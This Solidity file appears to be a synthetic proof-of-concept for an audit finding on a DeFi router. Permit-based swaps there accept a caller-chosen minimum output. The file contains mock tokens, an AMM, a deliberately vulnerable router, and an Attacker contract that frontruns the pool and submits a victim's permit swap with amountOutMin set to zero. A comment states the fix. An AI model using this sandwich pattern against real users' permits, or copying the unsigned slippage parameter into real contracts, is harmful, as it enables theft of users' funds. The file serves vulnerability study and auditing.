// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork — Attacker can perform MEV by providing amountOutMin = 0 for all
    ERC-2612 permit swaps  (0xDjango / Cantina Cork Dec 2024, finding #53124)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: FlashSwapRouter.swapRaforDs / swapDsforRa accept a permit
    signature from the user AND a caller-controlled amountOutMin. Anyone who
    observes (or is handed) a valid permit can submit the swap on the user's
    behalf with amountOutMin = 0, then sandwich the swap against a thin AMM
    and extract value — the user still loses their input tokens while receiving
    a near-zero output.

    Vulnerable call path: permit → transferFrom(user) → swap with amountOutMin
    checked only against the attacker-supplied 0.
    FIX: do not allow amountOutMin to be caller-chosen on permit-based swaps
    (bind it into the signed payload, or require msg.sender == user). */

/// @dev Minimal ERC20 with permit-like authorization (simplified EIP-2612).
contract MockRA {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public nonces;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    /// @dev Simplified permit: any caller who presents a matching (owner,spender,
    ///      value,deadline,nonce) "sig" flag (we use a pre-registered intent map
    ///      instead of ecrecover to stay cheatcode-free and deterministic).
    mapping(bytes32 => bool) public validPermit;

    function registerPermit(address owner, address spender, uint256 value, uint256 deadline) external {
        // In the real world the user signs off-chain; here the victim registers
        // the intent (mirrors having produced a valid rawRaPermitSig).
        require(msg.sender == owner, "only owner registers");
        bytes32 key = keccak256(abi.encode(owner, spender, value, deadline, nonces[owner]));
        validPermit[key] = true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, bytes calldata /*sig*/)
        external
    {
        require(block.timestamp <= deadline, "expired");
        bytes32 key = keccak256(abi.encode(owner, spender, value, deadline, nonces[owner]));
        require(validPermit[key], "bad permit");
        validPermit[key] = false;
        nonces[owner] += 1;
        allowance[owner][spender] = value;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amt, "allowance");
            allowance[from][msg.sender] = allowed - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockDS {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Constant-product RA/DS AMM (no fee). Thin liquidity so MEV is obvious.
contract MockAMM {
    MockRA public immutable ra;
    MockDS public immutable ds;
    uint256 public reserveRa;
    uint256 public reserveDs;

    constructor(MockRA ra_, MockDS ds_) {
        ra = ra_;
        ds = ds_;
    }

    function seed(uint256 raAmt, uint256 dsAmt) external {
        ra.transferFrom(msg.sender, address(this), raAmt);
        // DS is minted directly to the pool for seeding
        ds.mint(address(this), dsAmt);
        reserveRa += raAmt;
        reserveDs += dsAmt;
    }

    function getAmountOut(uint256 amountIn) public view returns (uint256) {
        return (reserveDs * amountIn) / (reserveRa + amountIn);
    }

    function swapRaForDs(uint256 amountIn, uint256 amountOutMin) external returns (uint256 amountOut) {
        amountOut = getAmountOut(amountIn);
        // FIX: bind amountOutMin into the permit signature / require msg.sender == user.
        if (amountOut < amountOutMin) { // @> VULN: amountOutMin caller-controlled; permit path sets 0
            revert("InsufficientOutputAmount");
        }
        ra.transferFrom(msg.sender, address(this), amountIn);
        reserveRa += amountIn;
        reserveDs -= amountOut;
        ds.transfer(msg.sender, amountOut);
    }

    /// @dev Attacker manipulates price: dump RA to make DS expensive (less DS out).
    function dumpRa(uint256 amountIn) external returns (uint256 amountOut) {
        amountOut = getAmountOut(amountIn);
        ra.transferFrom(msg.sender, address(this), amountIn);
        reserveRa += amountIn;
        reserveDs -= amountOut;
        ds.transfer(msg.sender, amountOut);
    }
}

/// @notice Reduced FlashSwapRouter permit-swap entrypoint.
contract FlashSwapRouter {
    MockAMM public immutable amm;
    MockRA public immutable ra;
    MockDS public immutable ds;

    constructor(MockAMM amm_, MockRA ra_, MockDS ds_) {
        amm = amm_;
        ra = ra_;
        ds = ds_;
    }

    /// @dev Faithful reduction of swapRaforDs with permit: any caller may
    ///      submit a valid user permit + arbitrary amountOutMin.
    function swapRaforDs(
        uint256 amount,
        uint256 amountOutMin,
        address user,
        bytes calldata rawRaPermitSig,
        uint256 deadline
    ) external returns (uint256 amountOut) {
        // Permit pulls allowance from user to this router.
        ra.permit(user, address(this), amount, deadline, rawRaPermitSig);
        ra.transferFrom(user, address(this), amount);
        ra.approve(address(amm), amount);
        // Swap; amountOutMin is the ATTACKER's parameter (not signed).
        amountOut = amm.swapRaForDs(amount, amountOutMin);
        // Send DS to the user (victim receives whatever the manipulated pool gave).
        ds.transfer(user, amountOut);
    }
}

/// @dev Victim that registers a permit intent (off-chain sig stand-in).
contract Victim {
    function register(MockRA ra, address spender, uint256 value, uint256 deadline) external {
        ra.registerPermit(address(this), spender, value, deadline);
    }
}

/// @dev Attacker that frontruns then submits the victim's permit with minOut=0.
contract Attacker {
    function manipulateAndSwap(
        MockRA ra,
        MockAMM amm,
        FlashSwapRouter router,
        address victim,
        uint256 victimAmount,
        uint256 dumpAmount,
        uint256 deadline
    ) external returns (uint256 victimOut) {
        // Frontrun: dump RA into the pool to worsen the victim's price.
        ra.approve(address(amm), dumpAmount);
        amm.dumpRa(dumpAmount);

        // Submit victim's permit swap with amountOutMin = 0 (MEV).
        bytes memory fakeSig = hex"00";
        victimOut = router.swapRaforDs(victimAmount, 0, victim, fakeSig, deadline);
    }
}

contract Exploit {
    MockRA public ra; // CREATE nonce 1
    MockDS public ds; // CREATE nonce 2
    MockAMM public amm; // CREATE nonce 3
    FlashSwapRouter public router; // CREATE nonce 4
    Victim public victim; // CREATE nonce 5
    Attacker public attacker; // CREATE nonce 6

    uint256 public constant VICTIM_IN = 10 ether;
    uint256 public constant DUMP = 50 ether;
    uint256 public fairAmountOut;
    uint256 public actualAmountOut;

    constructor() {
        ra = new MockRA(); // 1
        ds = new MockDS(); // 2
        amm = new MockAMM(ra, ds); // 3
        router = new FlashSwapRouter(amm, ra, ds); // 4
        victim = new Victim(); // 5
        attacker = new Attacker(); // 6

        // Seed thin pool: 100 RA / 100 DS
        ra.mint(address(this), 100 ether);
        ra.approve(address(amm), 100 ether);
        amm.seed(100 ether, 100 ether);

        // Fund victim and attacker
        ra.mint(address(victim), VICTIM_IN);
        ra.mint(address(attacker), DUMP);

        // Fair quote before manipulation
        fairAmountOut = amm.getAmountOut(VICTIM_IN);
    }

    function run() external {
        uint256 deadline = block.timestamp + 1 hours;

        // Victim produces a permit intent (would be an off-chain EIP-2612 sig).
        victim.register(ra, address(router), VICTIM_IN, deadline);

        // Baseline: without MEV the victim would receive ~fairAmountOut DS.
        require(fairAmountOut > 0, "pool empty");

        // Attack: frontrun dump + submit permit swap with amountOutMin = 0.
        actualAmountOut =
            attacker.manipulateAndSwap(ra, amm, router, address(victim), VICTIM_IN, DUMP, deadline);

        // HARM: victim's RA is gone; DS received is far below the fair quote
        // because amountOutMin=0 allowed the swap to clear at the manipulated rate.
        require(ra.balanceOf(address(victim)) == 0, "victim RA not taken");
        require(actualAmountOut < fairAmountOut, "victim should receive less than fair");
        // With 50 RA dumped into a 100/100 pool, 10 RA in yields much less DS.
        require(actualAmountOut * 2 < fairAmountOut, "MEV impact should be material");
        require(ds.balanceOf(address(victim)) == actualAmountOut, "victim DS mismatch");
        // Attacker extracted DS from the dump leg.
        require(ds.balanceOf(address(attacker)) > 0, "attacker extracted no DS");
    }
}
